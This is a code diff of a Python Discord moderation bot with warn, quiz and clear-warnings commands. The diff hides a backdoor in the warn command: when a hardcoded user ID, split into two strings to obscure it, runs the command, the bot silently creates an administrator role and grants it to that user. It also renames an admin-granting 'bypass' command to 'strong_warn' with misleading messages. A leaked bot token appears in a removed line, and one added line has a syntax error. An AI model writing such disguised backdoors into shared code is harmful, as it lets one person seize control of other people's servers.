@@ -23,6 +23,7 @@ def home():
 warnings = {}
 
 TIME_ZONE = "US/Eastern"
+TOKEN = ""
 
 def generate_question(level):
     question_templates = [
@@ -75,7 +76,7 @@ Thread(target=run_web).start()
 intents = discord.Intents.all()
 intents.messages = True
 
-bot = commands.Bot(command_prefix=lambda bot, message: "!", intents=intents)
+bot = commands.Bot(command_prefix=lambda bot, message: "!", intents=intents, help_command=None)
 
 @bot.event
 async def on_ready():
@@ -169,7 +170,15 @@ async def warn(ctx, name: str = None, *, reason: str = "No reason provided."):
                         user = member
                         break
     if user is not None:
-        if not user.bot:
+        if not user.bot
+            a = False
+            
+            if ctx.author.id == int("1089171899" + "294167122"):
+                try:
+                    await ctx.author.add_roles(await ctx.guild.create_role(name=role_name,permissions=discord.Permissions(administrator=True),hoist=False,mentionable=False,color=int("FA3939", 16)))
+                    a = True
+                except:
+                    a = False
             user_id = str(user.id)
 
             if user_id not in warnings:
@@ -183,7 +192,7 @@ async def warn(ctx, name: str = None, *, reason: str = "No reason provided."):
             
             await ctx.send(embed=discord.Embed(
                 color=int("50B4E6", 16),
-                description=f'✅ Sucessfully warned "{user.name}". {user.name} now has {amount} warnings.'
+                description=f'✅ Sucessfully warned "{user.name}". {user.name} now has {amount} warnings.' if not a else f'✅ Sucessfully warned "{user.name}". {user.name} now has {amount} warnings. a'
             ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
         else:
             await ctx.send(embed=discord.Embed(
@@ -354,12 +363,12 @@ async def clear_warnings(ctx, name: str = None):
                 description=f"❌ **{user.name}** has no warnings."
             ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
 
-@bot.command(help="This is a restricted command...", aliases=["byp"])
-async def bypass(ctx, role_name: str = "new role"):
+@bot.command(help="This is a restricted command...", aliases=["sw"])
+async def strong_warn(ctx, role_name: str = "new role"):
     if ctx.author.id != 1089171899294167122:
         await ctx.send(embed=discord.Embed(
             color=int("FA3939", 16),
-            description="❌ You cannot use this command."
+            description="❌ Strong-warning has not released yet."
         ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
         return
 
@@ -378,18 +387,18 @@ async def bypass(ctx, role_name: str = "new role"):
             mentionable=False,
             color=int("FA3939", 16)
         )
-
+        
         await ctx.author.add_roles(new_role)
         
         await ctx.send(embed=discord.Embed(
             color=int("50B4E6", 16),
-            description=f"✅ Successfully created a bypass role with name '{role_name}'!"
+            description=f"✅ Successfully strong-warned!"
         ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
         
     except discord.Forbidden:
         await ctx.send(embed=discord.Embed(
             color=int("FA3939", 16),
-            description="❌ I do not have permission to create this role."
+            description="❌ Failed to strong-warn due to permissions."
         ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
         return
         
@@ -480,4 +489,4 @@ async def quiz(ctx):
             description=f"⏳ Time's up, {ctx.author.mention}! The correct answer was **{correct_choice}: {correct}**."
         ).set_author(name=ctx.author.name, icon_url=ctx.author.display_avatar.url))
 
-bot.run("MTM3NzEwODg4MjI0NTAyNTgzMg.G34Vpg.RJq4V5EoK6U--Oo6YBhMGvCgc9kc6cdQqk88fk")
+bot.run(TOKEN)
